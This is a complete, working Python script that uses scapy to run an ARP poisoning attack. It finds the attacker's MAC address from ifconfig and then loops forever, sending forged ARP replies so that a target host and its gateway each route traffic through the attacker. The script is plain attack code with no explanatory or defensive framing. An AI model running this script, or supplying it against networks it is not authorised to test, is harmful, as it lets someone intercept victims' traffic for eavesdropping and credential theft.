from scapy.all import *
import subprocess
import re

target_ip = "10.10.10.128"
gateway_ip = "10.10.10.2"

ifconfigResult = subprocess.check_output("ifconfig eth0", shell = True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen", ifconfigResult).group(1).strip()

eth = Ether(src=attacker_mac)
target_arp = ARP(hwsrc = attacker_mac, psrc = gateway_ip, pdst = target_ip)
gateway_arp = ARP(hwsrc = attacker_mac, psrc = target_ip, pdst = gateway_ip)

print("Arp Poisoning Attack Is Started ....")

while True:
	try:
		sendp(eth/target_arp, verbose = False)
		sendp(eth/gateway_arp, verbose = False)
	except KeyboardInterrupt:
		print("Arp poisoning is stopped...")
		break	
